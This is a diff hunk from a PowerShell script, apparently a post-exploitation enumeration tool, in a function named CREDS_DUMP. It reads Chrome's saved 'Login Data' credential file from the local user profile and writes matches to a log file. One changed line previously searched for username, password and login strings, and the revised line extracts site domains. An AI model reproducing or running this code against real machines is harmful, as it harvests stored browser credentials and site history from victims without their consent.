@@ -709,13 +709,13 @@ function CREDS_DUMP {
     If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
         echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
     }else{
-        $Json = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"|select-string -pattern "http","user","passw","login"
+        $Json = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"|Select-String -pattern "http","https"
         If(-not($Json) -or $Json -eq $null){
             echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
         }else{
             ForEach ($Key in $Json){
                 $Regex = $Key -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
-                $ParseData = $Regex.Split('/')[2]
+                $ParseData = $Regex.Split('/')[2]            # Extract from string only the DomainName ..
                 echo $ParseData >> $LogFilePath\BrowserEnum.log
             }
        }
